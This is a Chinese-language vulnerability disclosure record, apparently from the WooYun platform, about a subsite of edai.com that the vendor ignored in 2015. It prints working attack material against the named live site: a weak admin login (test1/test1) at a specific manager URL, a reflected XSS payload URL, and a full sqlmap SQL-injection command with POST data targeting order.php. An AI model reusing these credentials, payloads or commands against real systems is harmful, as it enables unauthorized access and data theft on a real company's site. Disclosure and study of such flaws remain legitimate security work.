wybug_title: 易贷网某分站SQL注入\Xss\弱口令
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-09-09：	细节已通知厂商并且等待厂商处理中									2015-09-14：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： hhhh 详细说明：  http://yimin.edai.com/manager/cx/index.php弱口令test1 密码test1win8+iis7.5 找不到拿shell方法。

反射xss一枚http://yimin.edai.com/immigrate.php?act=list&classid=15&page=9"><script>alert(1)</script>POST SQL
C:\Python27\sqlmap>sqlmap.py -u "http://yimin.edai.com//order.php" --data "btnSubmit=%e6%8f%90%e4%ba%a4%e8%a1%a8%e5%8d%95&act=immigratecheck&age=20&aim%5b%5d=%e7%be%8e%e5%9b%bd&content=&english=%e4%b8%8d%e4%bc%9a&id=28&is_legal=%e6%98%af&is_marry=1&is_stockholder=%e6%98%af&job=1&means=100%e4%b8%87%e4%bb%a5%e4%b8%8b&nature=%e6%9c%89%e9%99%90%e5%85%ac%e5%8f%b8&province=NY&sex=%e5%85%88%e7%94%9f&tel=555-666-0606&user=sxniwsik&wish%5b%5d=%e5%ad%90%e5%a5%b3%e6%8e%a5%e6%94%b6%e6%9b%b4%e5%a5%bd%e7%9a%84%e6%95%99%e8%82%b2" --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150823}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal.
